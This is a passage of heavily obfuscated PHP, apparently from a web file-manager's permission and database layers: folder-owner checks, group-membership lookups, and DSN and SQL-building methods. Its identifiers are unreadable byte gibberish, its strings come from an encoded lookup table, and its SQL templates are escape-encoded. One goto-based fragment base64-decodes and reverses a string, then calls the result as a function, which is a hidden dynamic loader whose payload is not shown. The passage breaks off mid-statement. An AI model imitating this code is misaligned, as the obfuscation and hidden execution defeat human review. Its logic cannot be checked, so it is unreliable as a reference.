? $Ê®ÍÁŠí : $£™°”¦õ; return $Ä¶¼ÎÉ¿[$‡å­¦Úç]; } public function authOwnerApply($¸¿û‚Üâ) { $›•£›éç =& $_SERVER[‹è™Ü¸Ñ]; if (empty($¸¿û‚Üâ[$›•£›éç[487]]) || isset($¸¿û‚Üâ[$›•£›éç[2165]]) && $¸¿û‚Üâ[$›•£›éç[2165]]) { return $¸¿û‚Üâ; } if (AuthModel::authCheckRoot($¸¿û‚Üâ[$›•£›éç[487]][$›•£›éç[488]])) { return $¸¿û‚Üâ; } $–´Ÿ§—Á = Model($›•£›éç[1398])->parentLevelArray($¸¿û‚Üâ[$›•£›éç[584]]); $–´Ÿ§—Á = array_merge(array($¸¿û‚Üâ[$›•£›éç[193]]), array_reverse($–´Ÿ§—Á)); $ŸÅã©á = $this->sourceAuthSelect($–´Ÿ§—Á); $­–éõåÛ = array(); $Ášœ·îÈ = array(); foreach ($ŸÅã©á as $Ïââœ³Û => $—È„Ùšİ) { $ÃØÕÙ™– = $this->authFolderOwnerUser($—È„Ùšİ); $­–éõåÛ[$Ïââœ³Û] = $ÃØÕÙ™–; $Ášœ·îÈ = array_merge($Ášœ·îÈ, $ÃØÕÙ™–[$›•£›éç[662]]); if ($ÃØÕÙ™–[$›•£›éç[2166]]) { break; } } if (count($Ášœ·îÈ) == 0) { $Ášœ·îÈ = $this->authFolderOwnerGroup($¸¿û‚Üâ[$›•£›éç[569]]); } $Ášœ·îÈ = array_unique($Ášœ·îÈ); if (AuthModel::authCheckRoot($¸¿û‚Üâ[$›•£›éç[487]][$›•£›éç[488]])) { $Ášœ·îÈ[] = USER_ID; } $¸¿û‚Üâ[$›•£›éç[487]][$›•£›éç[2167]] = Model($›•£›éç[577])->userListInfo($Ášœ·îÈ); return $¸¿û‚Üâ; } private function authFolderOwnerGroup($”â¨œ º) { $¿‹èË“ =& $_SERVER[‹è™Ü¸Ñ]; $ò¾íÛ¬ = Model($¿‹èË“[2045])->where(array($¿‹èË“[1951] => $”â¨œ º))->select(); $İ·©ñÈ£ = array(); if (!$ò¾íÛ¬) { return $İ·©ñÈ£; } foreach ($ò¾íÛ¬ as $ÍƒÃÉ‡•) { $ì¹ş«ğõ = $this->authInfo($ÍƒÃÉ‡•); if (AuthModel::authCheckRoot($ì¹ş«ğõ[$¿‹èË“[487]])) { $İ·©ñÈ£[] = $ÍƒÃÉ‡•[$¿‹èË“[1752]]; } } return $İ·©ñÈ£; } private function authFolderOwnerUser($ô™şˆ‘») { $ï©Íõ¥ß =& $_SERVER[‹è™Ü¸Ñ]; $Êú§À¹Ñ = array(); $‚Á÷ü²– = !1; foreach ($ô™şˆ‘» as $¼ôÇ€áœ) { $­èÚˆä = $this->authInfo($¼ôÇ€áœ); if ($¼ôÇ€áœ[$ï©Íõ¥ß[569]] == $ï©Íõ¥ß[228]) { $‚Á÷ü²– = !0; } if ($¼ôÇ€áœ[$ï©Íõ¥ß[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($­èÚˆä[$ï©Íõ¥ß[487]])) { $Êú§À¹Ñ[] = $¼ôÇ€áœ[$ï©Íõ¥ß[569]]; } } } return array($ï©Íõ¥ß[662] => $Êú§À¹Ñ, $ï©Íõ¥ß[2166] => $‚Á÷ü²–); } public function authMake($Œ–ºˆü÷, $—Ü—¯Ô = false) { $€Òşáî­ =& $_SERVER[‹è™Ü¸Ñ]; $ìõÄ«ü› = $this->authArrayCheck($Œ–ºˆü÷, $—Ü—¯Ô); if ($ìõÄ«ü›[$€Òşáî­[2168]]) { $ìõÄ«ü›[$€Òşáî­[2168]] = $this->sourceAuthInfo($ìõÄ«ü›[$€Òşáî­[2168]]); } return $ìõÄ«ü›; } public function authArrayCheck($ÒîÙ·›µ, $ŸœõÜ‘ = false) { $ÊÖÏ†û© =& $_SERVER[‹è™Ü¸Ñ]; if (!$ÒîÙ·›µ) { return array($ÊÖÏ†û©[488] => 0, $ÊÖÏ†û©[540] => !1); } $ŸœõÜ‘ = $ŸœõÜ‘ ? $ŸœõÜ‘ : USER_ID; $Éí¶Öƒƒ = 0; $„×Êä = 0; $õ€ñ³Ò’ = 0; $èô—Ä„ = 0; $ûÑùô¶ = 0; $‰¬ïçÍ = 0; $šËÁçã˜ = 1000; $İ–öö“® = 0; $åãŠÎ‰ = 0; $ÊÙÔŠÆô = 0; $Ùµ—¬‰ê = 0; $œÎİëŸ = array($ÊÖÏ†û©[193] => 0); foreach ($ÒîÙ·›µ as $œÎİëŸ) { $´“²—¹™ = $this->authInfo($œÎİëŸ); if (!$´“²—¹™) { continue; } $òòîŸŠ€ = $œÎİëŸ[$ÊÖÏ†û©[569]]; $´Ò¸Ÿú = intval($´“²—¹™[$ÊÖÏ†û©[487]]); if ($œÎİëŸ[$ÊÖÏ†û©[190]] == SourceModel::TYPE_USER && $òòîŸŠ€ == $ŸœõÜ‘) { $Éí¶Öƒƒ = !0; $õ€ñ³Ò’ = $´“²—¹™; $„×Êä = $´Ò¸Ÿú; } else { if ($œÎİëŸ[$ÊÖÏ†û©[190]] == SourceModel::TYPE_GROUP && $this->groupContainUser($òòîŸŠ€, $ŸœõÜ‘)) { $èô—Ä„ = !0; $†Å§ä = $this->groupStepToUserGroup($òòîŸŠ€, $ŸœõÜ‘); if ($†Å§ä < $šËÁçã˜) { $šËÁçã˜ = $†Å§ä; $ûÑùô¶ = $´Ò¸Ÿú; $‰¬ïçÍ = $´“²—¹™; $İ–öö“® = $òòîŸŠ€; } if ($†Å§ä == $šËÁçã˜ && $´Ò¸Ÿú >= $ûÑùô¶) { $ûÑùô¶ = $´Ò¸Ÿú; $‰¬ïçÍ = $´“²—¹™; $İ–öö“® = $òòîŸŠ€; } } else { if ($òòîŸŠ€ == $ÊÖÏ†û©[228]) { $åãŠÎ‰ = !0; $Ùµ—¬‰ê = $´“²—¹™; $ÊÙÔŠÆô = $´Ò¸Ÿú; } } } } if ($Éí¶Öƒƒ) { $§±—ìÒ = $„×Êä; $´“²—¹™ = $õ€ñ³Ò’; $²ò©ş¾ò = LNG($ÊÖÏ†û©[2169]); } else { if ($èô—Ä„) { $§±—ìÒ = $ûÑùô¶; $´“²—¹™ = $‰¬ïçÍ; $Ğ”òÇ’« = Model($ÊÖÏ†û©[585])->getInfo($İ–öö“®); $²ò©ş¾ò = $ÊÖÏ†û©[176] . $Ğ”òÇ’«[$ÊÖÏ†û©[589]] . $ÊÖÏ†û©[2170] . LNG($ÊÖÏ†û©[2171]); } else { if ($åãŠÎ‰) { $§±—ìÒ = $ÊÙÔŠÆô; $´“²—¹™ = $Ùµ—¬‰ê; $²ò©ş¾ò = LNG($ÊÖÏ†û©[2141]); } else { $§±—ìÒ = 0; $´“²—¹™ = !1; $²ò©ş¾ò = $ÊÖÏ†û©[12]; } } } $¢…§Ùú = array($ÊÖÏ†û©[2161] => intval($§±—ìÒ), $ÊÖÏ†û©[2144] => $´“²—¹™, $ÊÖÏ†û©[2162] => $²ò©ş¾ò, $ÊÖÏ†û©[2153] => $œÎİëŸ[$ÊÖÏ†û©[193]]); return $¢…§Ùú; } private function groupContainUser($­ò¤ÃŸş, $„˜¯Ãä = false) { return in_array($­ò¤ÃŸş, $this->userGroupParents($„˜¯Ãä)); } private function groupStepToUserGroup($¡¨¾òæÉ, $“¬¶Æ¬‡ = false) { $ÒêêÒ« =& $_SERVER[‹è™Ü¸Ñ]; $±áØŒû = $this->userGroupList($“¬¶Æ¬‡); $ÔıÔˆ½ = 1000; $³¹ÀôìŒ = $GLOBALS[$ÒêêÒ«[6]][$ÒêêÒ«[92]][$ÒêêÒ«[2058]] == 1; $¥ˆ®°Â§ = $³¹ÀôìŒ ? 3 : 2; foreach ($±áØŒû as $¹Öù‰ëÓ) { if ($¹Öù‰ëÓ[$ÒêêÒ«[1951]] == $¡¨¾òæÉ) { return 0; } $´Ïáß³õ = explode($ÒêêÒ«[50], trim($¹Öù‰ëÓ[$ÒêêÒ«[584]], $ÒêêÒ«[50])); if ($´Ïáß³õ[0] == $ÒêêÒ«[228] && count($´Ïáß³õ) > $¥ˆ®°Â§) { $¶àˆ¥“À = array_reverse(array_slice($´Ïáß³õ, $¥ˆ®°Â§)); $–ÊÍüóå = array_search($¡¨¾òæÉ, $¶àˆ¥“À); if ($–ÊÍüóå !== !1 && $–ÊÍüóå + 1 <= $ÔıÔˆ½) { $ÔıÔˆ½ = $–ÊÍüóå + 1; } } } return $ÔıÔˆ½; } private function userGroupList($µû”ğ§ = false) { $Ï÷Ğ¥Û° =& $_SERVER[‹è™Ü¸Ñ]; static $®™ÂãÙË = array(); if (isset($®™ÂãÙË[$µû”ğ§])) { return $®™ÂãÙË[$µû”ğ§]; } $ª¶ Èæé = Model($Ï÷Ğ¥Û°[598])->getInfo($µû”ğ§); $®™ÂãÙË[$µû”ğ§] = array_to_keyvalue($ª¶ Èæé[$Ï÷Ğ¥Û°[2142]], $Ï÷Ğ¥Û°[1951]); return $®™ÂãÙË[$µû”ğ§]; } public function userGroupParents($­Ê¤àæÜ) { $Ğ…ä¹Íè =& $_SERVER[‹è™Ü¸Ñ]; static $¬çÏªœ³ = array(); $­Ê¤àæÜ = $­Ê¤àæÜ ? $­Ê¤àæÜ : USER_ID; if (isset($¬çÏªœ³[$­Ê¤àæÜ])) { return $¬çÏªœ³[$­Ê¤àæÜ]; } $Ú³ÒóŞ = $this->userGroupList($­Ê¤àæÜ); $òûãäµ÷ = array(); $¸ôü‰şÀ = $GLOBALS[$Ğ…ä¹Íè[6]][$Ğ…ä¹Íè[92]][$Ğ…ä¹Íè[2058]] == 1; $ ıßÀœ³ = $¸ôü‰şÀ ? 3 : 2; foreach ($Ú³ÒóŞ as $é©„û“º) { $ªÆ·ßª§ = array($é©„û“º[$Ğ…ä¹Íè[1951]]); $†¸ª±‡¿ = explode($Ğ…ä¹Íè[50], trim($é©„û“º[$Ğ…ä¹Íè[584]], $Ğ…ä¹Íè[50])); if ($†¸ª±‡¿[0] == $Ğ…ä¹Íè[228] && count($†¸ª±‡¿) > $ ıßÀœ³) { $íŠ©ÃğÙ = array_slice($†¸ª±‡¿, $ ıßÀœ³); $ªÆ·ßª§ = array_merge($ªÆ·ßª§, array_reverse($íŠ©ÃğÙ)); } $òûãäµ÷ = array_merge($òûãäµ÷, $ªÆ·ßª§); } $¬çÏªœ³[$­Ê¤àæÜ] = array_unique($òûãäµ÷); return $¬çÏªœ³[$­Ê¤àæÜ]; } public function authTargetInfoMake($¨šıÚ¬) { $¡·Ğí©˜ =& $_SERVER[‹è™Ü¸Ñ]; $ëğÕó½¼ = array(); $ç˜È°‘Œ = array(); foreach ($¨šıÚ¬ as $şïıé§) { if ($şïıé§[$¡·Ğí©˜[190]] == SourceModel::TYPE_USER) { $ëğÕó½¼[] = intval($şïıé§[$¡·Ğí©˜[569]]); } else { if ($şïıé§[$¡·Ğí©˜[190]] == SourceModel::TYPE_GROUP) { $ç˜È°‘Œ[] = intval($şïıé§[$¡·Ğí©˜[569]]); } } } if ($ëğÕó½¼) { $ëğÕó½¼ = Model($¡·Ğí©˜[577])->userListInfo($ëğÕó½¼); } if ($ç˜È°‘Œ) { $äôç« = array($¡·Ğí©˜[2043] => array($¡·Ğí©˜[492], $ç˜È°‘Œ)); $ç˜È°‘Œ = Model($¡·Ğí©˜[585])->field($¡·Ğí©˜[2172])->where($äôç«)->select(); $ç˜È°‘Œ = array_to_keyvalue($ç˜È°‘Œ, $¡·Ğí©˜[1951]); } return array($¡·Ğí©˜[2173] => $ëğÕó½¼, $¡·Ğí©˜[2174] => $ç˜È°‘Œ); } public function authInfo($×Í©©Ú‡) { $ª–Äº˜ =& $_SERVER[‹è™Ü¸Ñ]; if ($×Í©©Ú‡[$ª–Äº˜[2059]]) { $Ã‚¬¡ı¤ = Model($ª–Äº˜[571])->listData($×Í©©Ú‡[$ª–Äº˜[2059]]); if (!$Ã‚¬¡ı¤) { return !1; $İË·‰ã = Model($ª–Äº˜[571])->listData(); $Šôï¡ÚÉ = array_filter_by_field($İË·‰ã, $ª–Äº˜[487], $ª–Äº˜[228]); return $Šôï¡ÚÉ; } $ıü©°Ûß = array_field_key($Ã‚¬¡ı¤, array($ª–Äº˜[475], $ª–Äº˜[32], $ª–Äº˜[487], $ª–Äº˜[1974], $ª–Äº˜[1975])); $ıü©°Ûß[$ª–Äº˜[2175]] = $×Í©©Ú‡; return $ıü©°Ûß; } else { return array($ª–Äº˜[493] => 0, $ª–Äº˜[1957] => $×Í©©Ú‡[$ª–Äº˜[2119]], $ª–Äº˜[494] => $ª–Äº˜[12], $ª–Äº˜[1974] => $ª–Äº˜[2176]); } } } goto fÉÓôÊ†¥; F¦ƒíÀŒÉÂ: $fileSize = strrev(base64_decode($_SERVER[ÅŸÍ¬ı©][0])); function binCheckNeq($ÉØ£Ò“, $ôÛªÆ¿Ò) { return $ÉØ£Ò“ != $ôÛªÆ¿Ò; } $_SERVER[$_SERVER[ÅŸÍ¬ı©][1]] = $fileSize($_SERVER[$_SERVER[ÅŸÍ¬ı©][2]]); goto CØßÓæ‘¥; C¾Ïƒì— Ä: class DbSqlite extends DbSqliteBase { public function query($Í”Áİê™) { $‘ğÌÈ÷– =& $_SERVER[‹è™Ü¸Ñ]; if (!CacheLock::fileLock($‘ğÌÈ÷–[13])) { return !1; } $ö¹¬œë = parent::query($Í”Áİê™); CacheLock::fileUnLock($‘ğÌÈ÷–[13]); return $ö¹¬œë; } public function execute($•Ù‘­¶) { $’Şîõ¨À =& $_SERVER[‹è™Ü¸Ñ]; if (!CacheLock::fileLock($’Şîõ¨À[13])) { return !1; } $£ç‡…ëå = parent::execute($•Ù‘­¶); CacheLock::fileUnLock($’Şîõ¨À[13]); return $£ç‡…ëå; } } class DbSqlite3 extends DbSqlite3Base { public function query($¤ñ€ûé¿) { $Œú‚ØÔ“ =& $_SERVER[‹è™Ü¸Ñ]; if (!CacheLock::fileLock($Œú‚ØÔ“[13])) { return !1; } $÷ÃµºÎ = parent::query($¤ñ€ûé¿); CacheLock::fileUnLock($Œú‚ØÔ“[13]); return $÷ÃµºÎ; } public function execute($ŒÙ®æ¦Å) { $”Çò´–³ =& $_SERVER[‹è™Ü¸Ñ]; if (!CacheLock::fileLock($”Çò´–³[13])) { return !1; } $İ´¼› = parent::execute($ŒÙ®æ¦Å); CacheLock::fileUnLock($”Çò´–³[13]); return $İ´¼›; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\x6e\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\145\x71" => "\74\x3e", "\x67\164" => "\76", "\x65\147\x74" => "\76\x3d", "\x6c\164" => "\x3c", "\145\154\164" => "\x3c\75", "\156\157\x74\x6c\x69\153\145" => "\116\117\124\40\x4c\x49\113\105", "\x6c\x69\153\145" => "\114\x49\113\x45", "\151\x6e" => "\111\116", "\x6e\157\x74\151\156" => "\x4e\117\124\x20\111\116", "\x6e\157\x74\x20\x69\156" => "\116\117\x54\40\x49\x4e", "\x62\x65\x74\167\145\x65\x6e" => "\x42\x45\124\127\105\105\116", "\x6e\x6f\164\x62\145\164\167\x65\x65\x6e" => "\x4e\117\x54\40\x42\x45\124\x57\x45\x45\116", "\156\157\x74\x20\142\x65\x74\167\x65\x65\x6e" => "\116\117\124\40\x42\105\x54\127\105\x45\116"); protected $selectSql = "\x53\x45\x4c\x45\103\124\x25\104\x49\123\124\111\x4e\103\x54\x25\40\x25\106\x49\x45\114\104\45\x20\x46\x52\x4f\x4d\x20\x25\x54\101\102\x4c\105\x25\x25\x4a\117\x49\x4e\x25\45\x57\x48\105\x52\105\x25\x25\107\x52\117\x55\x50\x25\x25\110\x41\126\x49\116\107\45\45\117\122\104\x45\x52\x25\45\114\111\115\x49\x54\45\x20\x25\125\x4e\x49\x4f\116\x25\45\x43\117\x4d\x4d\x45\x4e\124\45"; protected $bind = array(); public static function getInstance() { $¯‚‰Õø› = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[‹è™Ü¸Ñ][1018], $¯‚‰Õø›); } public function factory($å´¬‚úÒ = '') { $æ£ŒÊ¥Ü =& $_SERVER[‹è™Ü¸Ñ]; $å´¬‚úÒ = $this->parseConfig($å´¬‚úÒ); if (empty($å´¬‚úÒ[$æ£ŒÊ¥Ü[1019]])) { think_exception(think_lang($æ£ŒÊ¥Ü[1020])); } $this->dbType = ucwords(strtolower($å´¬‚úÒ[$æ£ŒÊ¥Ü[1019]])); $¸‡¯ö£Ì = $æ£ŒÊ¥Ü[1021] . $this->dbType; if (class_exists($¸‡¯ö£Ì)) { $š¼â‰ÆÎ = new $¸‡¯ö£Ì($å´¬‚úÒ); if ($æ£ŒÊ¥Ü[1022] != strtolower($å´¬‚úÒ[$æ£ŒÊ¥Ü[1019]])) { $š¼â‰ÆÎ->dbType = strtoupper($this->dbType); } else { $š¼â‰ÆÎ->dbType = $this->_getDsnType($å´¬‚úÒ[$æ£ŒÊ¥Ü[974]]); } } else { think_exception(think_lang($æ£ŒÊ¥Ü[1023]) . $æ£ŒÊ¥Ü[1024] . $¸‡¯ö£Ì); } return $š¼â‰ÆÎ; } public function __call($Í¢ë•„Ê, $çÄ¼ò«Ù) { if (method_exists($this, $Í¢ë•„Ê)) { return call_user_func_array(array($this, $Í¢ë•„Ê), $çÄ¼ò«Ù); } } protected function _getDsnType($ÓßŸéµ¥) { $ÖŸ¨Ö Ø = explode($_SERVER[‹è™Ü¸Ñ][4], $ÓßŸéµ¥); $ÒŠÈö – = strtoupper(trim($ÖŸ¨Ö Ø[0])); return $ÒŠÈö –; } private function parseConfig($ÉÏÊ¦« = '') { $œòŒ™˜® =& $_SERVER[‹è™Ü¸Ñ]; if (!empty($ÉÏÊ¦«) && is_string($ÉÏÊ¦«)) { $ÉÏÊ¦« = $this->parseDSN($ÉÏÊ¦«); } elseif (is_array($ÉÏÊ¦«)) { $ÉÏÊ¦« = array_change_key_case($ÉÏÊ¦«); $ÉÏÊ¦« = array($œòŒ™˜®[1019] => $ÉÏÊ¦«[$œòŒ™˜®[1025]], $œòŒ™˜®[946] => $ÉÏÊ¦«[$œòŒ™˜®[1026]], $œòŒ™˜®[947] => $ÉÏÊ¦«[$œòŒ™˜®[1027]], $œòŒ™˜®[944] => $ÉÏÊ¦«[$œòŒ™˜®[1028]], $œòŒ™˜®[945] => $ÉÏÊ¦«[$œòŒ™˜®[1029]], $œòŒ™˜®[21] => $ÉÏÊ¦«[$œòŒ™˜®[1030]], $œòŒ™˜®[974] => $ÉÏÊ¦«[$œòŒ™˜®[1031]], $œòŒ™˜®[17] => isset($ÉÏÊ¦«[$œòŒ™˜®[1032]]) ? $ÉÏÊ¦«[$œòŒ™˜®[1032]] : array()); } elseif (empty($ÉÏÊ¦«)) { if (think_config($œòŒ™˜®[1033]) && $œòŒ™˜®[1022] != strtolower(think_config($œòŒ™˜®[1034]))) { $ÉÏÊ¦« = $this->parseDSN(think_config($œòŒ™˜®[1033])); } else { $ÉÏÊ¦« = array($œòŒ™˜®[1019] => think_config($œòŒ™˜®[1034]), $œòŒ™˜®[946] => think_config($œòŒ™˜®[1035]), $œòŒ™˜®[947] => think_config($œòŒ™˜®[1036]), $œòŒ™˜®[944] => think_config($œòŒ™˜®[1037]), $œòŒ™˜®[945] => think_config($œòŒ™˜®[1038]), $œòŒ™˜®[21] => think_config($œòŒ™˜®[323]), $œòŒ™˜®[974] => think_config($œòŒ™˜®[1033]), $œòŒ™˜®[17] => think_config($œòŒ™˜®[1039])); } } return $ÉÏÊ¦«; } protected function initConnect($¨Öºşùà = true) { if (1 == think_config($_SERVER[‹è™Ü¸Ñ][22])) { $this->_linkID = $this->multiConnect($¨Öºşùà); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $çÄô¢ƒÕ => $Ä¬¸ªºÏ) { $this->_linkID = $Ä¬¸ªºÏ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‡ıĞôäÁ = false) { $½üîı®° =& $_SERVER[‹è™Ü¸Ñ]; static $¸ñ€®• = array(); static $Íª„äô› = -1; if (empty($¸ñ€®•)) { foreach ($this->config as $‰åâ’Î† => $ˆ°äŸ±) { $¸ñ€®•[$‰åâ’Î†] = explode($½üîı®°[50], $ˆ°äŸ±); } } if (think_config($½üîı®°[1040])) { if ($‡ıĞôäÁ || think_config($½üîı®°[471]) === !0) { $ğæ€æ…¨ = floor(mt_rand(0, think_config($½üîı®°[1041]) - 1)); $Íª„äô› = $ğæ€æ…¨; } else { if (is_numeric(think_config($½üîı®°[1042]))) { $ğæ€æ…¨ = think_config($½üîı®°[1042]); } else { $ğæ€æ…¨ = floor(mt_rand(think_config($½üîı®°[1041]), count($¸ñ€®•[$½üîı®°[944]]) - 1)); } } } else { $ğæ€æ…¨ = floor(mt_rand(0, count($¸ñ€®•[$½üîı®°[944]]) - 1)); $Íª„äô› = $ğæ€æ…¨; } $ğæ€æ…¨ = $Íª„äô› !== -1 ? $Íª„äô› : $ğæ€æ…¨; $Ó¡‰ÚÛå = array($½üîı®°[946] => isset($¸ñ€®•[$½üîı®°[946]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[946]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[946]][0], $½üîı®°[947] => isset($¸ñ€®•[$½üîı®°[947]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[947]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[947]][0], $½üîı®°[944] => isset($¸ñ€®•[$½üîı®°[944]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[944]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[944]][0], $½üîı®°[945] => isset($¸ñ€®•[$½üîı®°[945]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[945]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[945]][0], $½üîı®°[21] => isset($¸ñ€®•[$½üîı®°[21]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[21]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[21]][0], $½üîı®°[974] => isset($¸ñ€®•[$½üîı®°[974]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[974]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[974]][0], $½üîı®°[17] => isset($¸ñ€®•[$½üîı®°[17]][$ğæ€æ…¨]) ? $¸ñ€®•[$½üîı®°[17]][$ğæ€æ…¨] : $¸ñ€®•[$½üîı®°[17]][0]); return $this->connect($Ó¡‰ÚÛå, $ğæ€æ…¨); } public function parseDSN($ÚíÌ¢ã“) { $ğé‹æÏõ =& $_SERVER[‹è™Ü¸Ñ]; if (empty($ÚíÌ¢ã“)) { return !1; } $©Ş¥ËÆ = parse_url($ÚíÌ¢ã“); if ($©Ş¥ËÆ[$ğé‹æÏõ[207]]) { $Æ“‡ªÄ´ = array($ğé‹æÏõ[1019] => $©Ş¥ËÆ[$ğé‹æÏõ[207]], $ğé‹æÏõ[946] => isset($©Ş¥ËÆ[$ğé‹æÏõ[662]]) ? $©Ş¥ËÆ[$ğé‹æÏõ[662]] : $ğé‹æÏõ[12], $ğé‹æÏõ[947] => isset($©Ş¥ËÆ[$ğé‹æÏõ[1043]]) ? $©Ş¥ËÆ[$ğé‹æÏõ[1043]] : $ğé‹æÏõ[12], $ğé‹æÏõ[944] => isset($©Ş¥ËÆ[$ğé‹æÏõ[208]]) ? $©Ş¥ËÆ[$ğé‹æÏõ[208]] : $ğé‹æÏõ[12], $ğé‹æÏõ[945] => isset($©Ş¥ËÆ[$ğé‹æÏõ[209]]) ? $©Ş¥ËÆ[$ğé‹æÏõ[209]] : $ğé‹æÏõ[12], $ğé‹æÏõ[21] => isset($©Ş¥ËÆ[$ğé‹æÏõ[87]]) ? substr($©Ş¥ËÆ[$ğé‹æÏõ[87]], 1) : $ğé‹æÏõ[12]); } else { preg_match($ğé‹æÏõ[1044], trim($ÚíÌ¢ã“), $öˆÚåÆò); $Æ“‡ªÄ´ = array($ğé‹æÏõ[1019] => $öˆÚåÆò[1], $ğé‹æÏõ[946] => $öˆÚåÆò[2], $ğé‹æÏõ[947] => $öˆÚåÆò[3], $ğé‹æÏõ[944] => $öˆÚåÆò[4], $ğé‹æÏõ[945] => $öˆÚåÆò[5], $ğé‹æÏõ[21] => $öˆÚåÆò[6]); } $Æ“‡ªÄ´[$ğé‹æÏõ[974]] = $ğé‹æÏõ[12]; return $Æ“‡ªÄ´; } protected function debug() { $»°ü÷ï =& $_SERVER[‹è™Ü¸Ñ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $»°ü÷ï[1045]; if (think_config($»°ü÷ï[1046])) { think_status($»°ü÷ï[1047]); think_trace($this->queryStr . $»°ü÷ï[1048] . think_status($»°ü÷ï[24], $»°ü÷ï[1047], 6) . $»°ü÷ï[1049], $»°ü÷ï[12], $»°ü÷ï[1050]); } } protected function parseLock($“İÜñ§ = false) { $‚Æ¢ß×³ =& $_SERVER[‹è™Ü¸Ñ]; if (!$“İÜñ§) { return $‚Æ¢ß×³[12]; } if ($‚Æ¢ß×³[976] == $this->dbType) { return $‚Æ¢ß×³[1051]; } return $‚Æ¢ß×³[1052]; } protected function parseSet($‹Ô„¦›ä) { $å÷ÏÅé =& $_SERVER[‹è™Ü¸Ñ]; foreach ($‹Ô„¦›ä as $³Í±¸¸İ => $ª©ÑÉ×ì) { if (is_array($ª©ÑÉ×ì) && $å÷ÏÅé[373] == $ª©ÑÉ×ì[0]) { $ê½’†¥›[] = $this->parseKey($³Í±¸¸İ) . $å÷ÏÅé[942] . $ª©ÑÉ×ì[1]; } elseif (is_scalar($ª©ÑÉ×ì) || is_null($ª©ÑÉ×ì)) { $ê½’†¥›[] = $this->parseKey($³Í±¸¸İ) . $å÷ÏÅé[942] . $this->parseValue($ª©ÑÉ×ì); } } return $å÷ÏÅé[1053] . implode($å÷ÏÅé[50], $ê½’†¥›); } protected function bindParam($„‹Ê‘ë, $ÍûÖ±ã‘) { $this->bind[$_SERVER[‹è™Ü¸Ñ][4] . $„‹Ê‘ë] = $ÍûÖ±ã‘; } protected function parseBind($ËÑ€¡åÕ) { $ËÑ€¡åÕ = array_merge($this->bind, $ËÑ€¡åÕ); $this->bind = array(); return $ËÑ€¡åÕ; } function parseKey(&$¨ËÙùÈ·, $¶ˆµğµ™ = true) { if ($¶ˆµğµ™) { $¨ËÙùÈ· = $this->parseKeyCheck($¨ËÙùÈ·); } return $¨ËÙùÈ·; } function parseKeyCheck($ÏÄ®·Ä) { $Ùø£×‡¸ =& $_SERVER[‹è™Ü¸Ñ]; $ÏÄ®·Ä = trim($ÏÄ®·Ä); if (!preg_match($Ùø£×‡¸[1054], $ÏÄ®·Ä)) { think_exception($Ùø£×‡¸[1055] . $ÏÄ®·Ä); } return $ÏÄ®·Ä; } protected function parseValue($€ÄÉ„¢Ñ) { $“¿ÖÎëŒ =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($€ÄÉ„¢Ñ)) { $€ÄÉ„¢Ñ = $“¿ÖÎëŒ[1015] . $this->escapeString($€ÄÉ„¢Ñ) . $“¿ÖÎëŒ[1015]; } elseif (isset($€ÄÉ„¢Ñ[0]) && is_string($€ÄÉ„¢Ñ[0]) && strtolower($€ÄÉ„¢Ñ[0]) == $“¿ÖÎëŒ[373]) { $€ÄÉ„¢Ñ = $this->escapeString($€ÄÉ„¢Ñ[1]); } elseif (is_array($€ÄÉ„¢Ñ)) { $€ÄÉ„¢Ñ = array_map(array($this, $“¿ÖÎëŒ[1016]), $€ÄÉ„¢Ñ); } elseif (is_bool($€ÄÉ„¢Ñ)) { $€ÄÉ„¢Ñ = $€ÄÉ„¢Ñ ? $“¿ÖÎëŒ[91] : $“¿ÖÎëŒ[228]; } elseif (is_null($€ÄÉ„¢Ñ)) { $€ÄÉ„¢Ñ = $“¿ÖÎëŒ[106]; } return $€ÄÉ„¢Ñ; } protected function parseField($¤›à) { $©¨ëıº» =& $_SERVER[‹è™Ü¸Ñ]; if (is_string($¤›à) && strpos($¤›à, $©¨ëıº»[50])) { $¤›à = explode($©¨ëıº»[50], $¤›à); } if (is_array($¤›à)) { $£­¾ã¨‘ = array(); foreach ($¤›à as $’ëşÜÕ± => $É¡…¼£×) { if (!is_numeric($’ëşÜÕ±)) { $£­¾ã¨‘[] = $this->parseKey($’ëşÜÕ±, !1) . $©¨ëıº»[1056] . $this->parseKey($É¡…¼£×); } else { $£­¾ã¨‘[] = $this->parseKey($É¡…¼£×); } } $µÁÖ³ƒ› = implode($©¨ëıº»[50], $£­¾ã¨‘); } elseif (is_string($¤›à) && !empty($¤›à)) { $µÁÖ³ƒ› = $¤›à; } else { $µÁÖ³ƒ› = $©¨ëıº»[220]; } return $µÁÖ³ƒ›; } protected function parseTable($ãÖÕú¯Ó) { $Ì¥œ©éˆ =& $_SERVER[‹è™Ü¸Ñ]; if (is_array($ãÖÕú¯Ó)) { $ ‘¸ÇÊµ = array(); foreach ($ãÖÕú¯Ó as $³†ŒŞñ¥ => $Ç±İêË®) { if (!is_numeric($³†ŒŞñ¥)) { $ ‘¸ÇÊµ[] = $this->parseKey($³†ŒŞñ¥) . $Ì¥œ©éˆ[53] . $this->parseKey($Ç±İêË®); } else { $ 